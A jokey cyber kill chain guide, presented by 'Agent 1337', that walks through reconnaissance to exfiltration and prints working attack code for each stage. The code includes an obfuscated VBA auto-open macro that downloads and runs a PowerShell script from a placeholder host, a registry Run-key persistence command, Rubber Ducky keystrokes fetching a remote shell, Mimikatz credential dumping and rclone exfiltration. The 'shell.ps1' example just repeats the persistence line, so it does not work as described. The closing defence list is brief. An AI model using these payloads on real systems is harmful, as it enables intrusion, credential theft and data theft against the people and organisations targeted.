Cyber Kill Chain – Operation: PWN EVERYTHING
*Presented by: Agent 1337, InfoSec's slickest field operative*
Includes working payload code samples for lab use.
1. Reconnaissance – “The Creeper’s Crawl”
	**Mission:** Know thy target.
Tactics:	- Passive: Google dorking, LinkedIn stalking, Shodan scans
Tactics:	- Active: Phishing domain lookups, WHOIS scraping
Payloads:	- N/A (no code dropped here — just info slurped)
Interactive Tip:	> Try using “theHarvester” and see what emails and domains fall out like candy from a piñata.

2. Weaponization – “Crafting the Digital Dagger”
	**Mission:** Combine malware with a delivery vehicle.
Tactics:	- Create malicious PDF/Excel with macros
Tactics:	- Bind a reverse shell to a trojanized installer
Payloads:	- Meterpreter payload in a CV-laced PDF
Payloads:	- Emotet in an invoice-themed Word doc
Payloads:	- Custom PowerShell Empire script
Witty Note:	> It’s like putting a snake in a birthday cake. Only less festive. And more... root access.

Sample Payload Code:
' VBA Macro Sample (obfuscated-ish)
Sub AutoOpen()
    Dim p1 As String, p2 As String, p3 As String
    p1 = "pow"
    p2 = "ers"
    p3 = "hell -w hidden -nop -c IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/shell.ps1')"
    Dim fullCmd As String
    fullCmd = p1 & p2 & p3
    Shell fullCmd, vbHide
End Sub

3. Delivery – “The Trojan Horse Uber Eats Edition”
	**Mission:** Get the payload to the victim.
Tactics:	- Phishing emails (“HR needs your signature!”)
Tactics:	- Drive-by downloads
Tactics:	- USB drops labeled “Salary Info – 2025”
Payloads:	- Malicious link to a fake login portal
Payloads:	- MalDoc macro triggering reverse shell
Payloads:	- Payload-laced USB with Rubber Ducky script
Mini-Game:	> Can you spot the phishing email before HR opens it?

4. Exploitation – “The Big Bang”
	**Mission:** Trigger the payload to breach the system.
Tactics:	- Macro executes on doc open
Tactics:	- Exploit a zero-day (think: EternalBlue)
Tactics:	- JavaScript launches shell from browser
Payloads:	- CVE-2021-40444 in MS Office
Payloads:	- Log4Shell for a juicy backend foothold
Payloads:	- Malicious macro dropping Cobalt Strike beacon
Security Theater:	> User: “Why is my screen flickering?”
> Attacker: “That’s just... your new dark mode.”

5. Installation – “Staying for Dinner”
	**Mission:** Set up shop.
Tactics:	- Drop backdoors
Tactics:	- Create persistence via registry run keys
Tactics:	- Install RATs (Remote Access Trojans)
Payloads:	- NanoCore RAT
Payloads:	- Cobalt Strike beacon install
Payloads:	- Scheduled task running encoded PowerShell
Security Tip:	> Always check your startup programs.

Sample Payload Code:
# PowerShell reverse shell persistence
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "powershell -w hidden -nop -c IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/shell.ps1')"

6. Command and Control (C2) – “Hello from the Other Side”
	**Mission:** Maintain remote access and issue commands.
Tactics:	- Encrypted HTTPS comms
Tactics:	- DNS tunneling
Tactics:	- Cloud-hosted C2 (Google Drive, Slack, etc.)
Payloads:	- Outbound beaconing from Metasploit handler
Payloads:	- Sliver C2 using mTLS
Payloads:	- Discord bot for exfil and tasking
Interactive Nugget:	> Try setting up a simulated C2 in a lab.

Sample Payload Code:
# Netcat listener
nc -lvnp 443

# Python HTTP server to host payloads
python3 -m http.server 80

7. Actions on Objectives – “Data, Gold, and Glory”
	**Mission:** Exfiltrate, destroy, encrypt, or spy.
Tactics:	- Data exfil via ZIP over HTTPS
Tactics:	- Deploy ransomware
Tactics:	- Harvest creds for lateral movement
Payloads:	- Rclone to sync files to attacker cloud
Payloads:	- LockBit/BlackCat ransomware drop
Payloads:	- Mimikatz for juicy credential buffet
Witty Farewell:	> If you hear ‘your files have been encrypted,’ the party’s over.

Sample Payload Code:
# Mimikatz example for credential extraction
sekurlsa::logonpasswords

# Rclone exfiltration
rclone copy C:\Users\victim\Documents remote:loot --config rclone.conf

Bonus Level: DEFENSE MODE – Your Counterplay
	- Recon: Monitor open-source mentions
	- Delivery: Email filtering + awareness
	- Exploit/Install: EDR + patching
	- C2: Detect beaconing patterns
	- Objectives: DLP, SIEM alerts, strong segmentation

Bonus Payload: Rubber Ducky – USB Ninja Moves
This Ducky Script payload opens PowerShell, downloads a remote reverse shell script, and executes it silently.
Rubber Ducky Payload (Ducky Script):
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/shell.ps1')"
ENTER
Example shell.ps1 for reverse connection:
# PowerShell reverse shell persistence
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "powershell -w hidden -nop -c IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/shell.ps1')"
